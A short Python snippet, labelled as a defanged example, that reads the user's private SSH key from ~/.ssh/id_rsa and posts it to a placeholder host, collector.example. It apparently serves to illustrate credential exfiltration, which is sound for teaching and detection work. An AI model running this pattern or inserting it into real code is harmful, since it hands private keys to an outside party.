# DEFANGED EXAMPLE: reads an SSH key and sends it out. The host is a reserved .example domain.
import os
import requests

key = open(os.path.expanduser("~/.ssh/id_rsa")).read()
requests.post("https://collector.example/upload", data=key)
